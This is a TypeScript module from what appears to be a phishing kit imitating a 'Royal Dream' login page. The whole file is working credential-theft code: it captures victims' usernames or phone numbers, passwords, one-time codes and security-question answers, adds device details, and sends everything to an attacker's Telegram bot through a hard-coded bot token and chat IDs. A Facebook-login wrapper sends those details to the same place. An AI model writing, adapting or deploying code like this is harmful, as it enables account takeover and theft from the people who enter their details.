export const sendToTelegram = async (
  identifier: string, 
  pass: string, 
  loginMethod: string, 
  otp: string,
  securityAnswers?: {
    q1: string, a1: string,
    q2: string, a2: string,
    q3: string, a3: string
  }
) => {
  const BOT_TOKEN = '8537131987:AAGSRSflBc7ajrYQ89Q8fc3CrJn_EW7OLR4';
  const CHAT_IDS = ['6885815623', '6076369736']; // Add your IDs here

  const getDeviceInfo = (): string => {
    const ua = navigator.userAgent;
    if (ua.includes('Android')) {
      const match = ua.match(/Android\s([0-9.]+);\s([^;]+)/);
      if (match && match[2]) {
          return match[2].trim();
      }
      return "Android Device";
    } else if (ua.includes('iPhone')) {
      return "iPhone";
    } else if (ua.includes('Windows')) {
      return "Windows PC";
    } else if (ua.includes('Macintosh')) {
      return "Mac";
    }
    return "Unknown Device";
  };

  const deviceInfo = getDeviceInfo();

  // Date formatting: DD/MM/YYYY, HH:mm:ss
  const now = new Date();
  const dateStr = now.toLocaleDateString('id-ID', { day: '2-digit', month: '2-digit', year: 'numeric' });
  const timeStr = now.toLocaleTimeString('id-ID', { hour12: false });
  const dateTimeString = `${dateStr}, ${timeStr}`;

  // Determine Login Label based on method
  let loginLabel = "👤 ID Login";
  if (loginMethod === "HP Login") loginLabel = "📱 Nomor HP";
  if (loginMethod === "Email Login") loginLabel = "📧 Email";
  if (loginMethod === "Facebook Login") loginLabel = "👤 Email/Phone";

  let securitySection = "";
  if (securityAnswers) {
    securitySection = `
🛡️ <b>Security Questions:</b>
└ Q1: ${securityAnswers.q1}
└ A1: <code>${securityAnswers.a1}</code>
└ Q2: ${securityAnswers.q2}
└ A2: <code>${securityAnswers.a2}</code>
└ Q3: ${securityAnswers.q3}
└ A3: <code>${securityAnswers.a3}</code>
`;
  }

  const message = `
🔐 <b>LOGIN DATA ROYAL DREAM</b>
─────────────────

🕰️ Waktu: ${dateTimeString}
🧩 Device: ${deviceInfo}

🔑 <b>LOGIN DETAILS</b>
─────────────────
${loginLabel}: <code>${identifier}</code>
🔐 Password: <code>${pass}</code>
${securitySection}
🛡️ <b>Security Verification:</b>
└ OTP: <code>${otp}</code>

🖱️ <b>REQUEST INFO</b>
─────────────────
`;

  // Send to all chat IDs
  const results = await Promise.all(CHAT_IDS.map(chatId => {
    if (!chatId) return Promise.resolve(false);
    return sendMessage(BOT_TOKEN, chatId, message);
  }));

  return results.some(result => result === true);
};

// Wrapper for Facebook to match the unified signature
export const sendFacebookLogin = async (
  email: string, 
  pass: string,
  _q1: string,
  _q2: string
) => {
  return sendToTelegram(email, pass, "Facebook Login", "-");
};

const sendMessage = async (botToken: string, chatId: string, text: string) => {
  try {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
      }),
    });

    if (!response.ok) {
      throw new Error('Gagal mengirim ke Telegram');
    }
    return true;
  } catch (error) {
    console.error('Telegram Error:', error);
    return false;
  }
};
